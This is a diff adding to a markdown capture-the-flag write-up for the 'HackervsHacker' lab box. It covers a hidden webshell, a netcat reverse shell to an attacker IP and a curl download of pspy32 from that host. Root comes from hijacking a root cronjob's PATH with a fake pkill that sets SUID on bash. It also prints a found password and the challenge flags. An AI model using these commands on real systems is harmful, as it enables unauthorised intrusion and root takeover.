@@ -1,12 +1,13 @@
 ---
 layout: default
 title: HackervsHacker
-status: incomplete
 ---
 
 ## TL;DR
 
+At this challenge we first find the hidden webshell of the hacker at `shell.pdf.php`. Then, we move to user `lachlan` using password found inside `.bash_history`. 
 
+We can't spawn tty because of the hacker, however, we find the cronjob of the hacker, with `pkill` using our PATH variable, which let us execute code as root.
 
 ### Recon
 
@@ -37,8 +38,7 @@ PORT   STATE SERVICE REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-
-### ...
+### Find hidden webshell of hacker at shell.pdf.php
 
 First, I visited the main page:
 
@@ -113,6 +113,114 @@ Let's paste the penelope payload:
 
 we got reverse shell but immediately disconnected.
 
-### Privilege Escalation to Root
+So, I executed this payload:
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.138.59 1337 >/tmp/f
+```
 
+and on the local machine:
+```bash
+nc -nvlp 1337
+```
 
+I tried to spawn pty using python:
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+But it immediately being killed, probably the hacker kills every `/dev/pts`.
+
+![spawn pty](image-5.png)
+
+Okay, we'll deal with this how it works now, that's fine.
+
+I went to the home folder of `lachlan` and grab the user flag:
+```bash
+www-data@b2r:/home/lachlan$ cat user.txt
+cat user.txt
+thm{af7e46b68081d4025c5ce10851430617}
+```
+
+### Move to user lachlan using password found inside .bash_history
+
+I read the file `.bash_history`:
+```bash
+www-data@b2r:/home/lachlan$ cat .bash_history
+cat .bash_history
+./cve.sh
+./cve-patch.sh
+vi /etc/cron.d/persistence
+echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
+ls -sf /dev/null /home/lachlan/.bash_history
+```
+
+We can see he reset his password to be `thisistheway123`.
+I tried to change user to `lachlan`, and it worked
+
+![su lachlan](image-6.png)
+
+I tried to login with ssh, we need to add the flag `-T` to disable TTY creation:
+```bash
+ssh lachlan@hackervshacker.thm -T # thisistheway123
+```
+
+![ssh](image-7.png)
+
+### Privilege Escalation to Root using override pkill based on PATH variable
+
+I tried to find how exactly the termination of the tty works, so I downloaded `pspy32`:
+```bash
+curl http://192.168.138.59:8082/pspy32 -s -o /tmp/pspy32
+chmod +x /tmp/pspy32
+/tmp/pspy32
+```
+
+Then, I connected via `ssh`, and waited for it to die:
+
+![ssh](image-8.png)
+
+We can see it prints `nope`. I suspected there is some cronjob that is doing that, but I wasn't sure where, so I searched for it:
+```bash
+grep "nope" /etc/cron* -rani --color=auto
+```
+
+![grep](image-9.png)
+
+We find it inside `/etc/cron.d/persistence`:
+```bash
+cat /etc/cron.d/persistence 
+PATH=/home/lachlan/bin:/bin:/usr/bin
+# * * * * * root backup.sh
+* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+```
+
+The interesting part is te PATH variable which uses first `/home/lachlan/bin`, and that it uses `pkill` without full path.
+
+Let's create our new `pkill`:
+```bash
+echo '#!/bin/bash\n/usr/bin/chmod u+s /bin/bash' > /home/lachlan/bin/pkill
+chmod +x /home/lachlan/bin/pkill
+```
+
+Now, we can check for `/bin/bash`:
+```bash
+ls -la /bin/bash
+-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+```
+
+Okay, we can spawn root shell and read the root flag:
+```bash
+bash -p
+```
+
+![bash -p](image-10.png)
+
+and the root flag:
+```bash
+cat /root/root.txt
+thm{7b708e5224f666d3562647816ee2a1d4}
+```
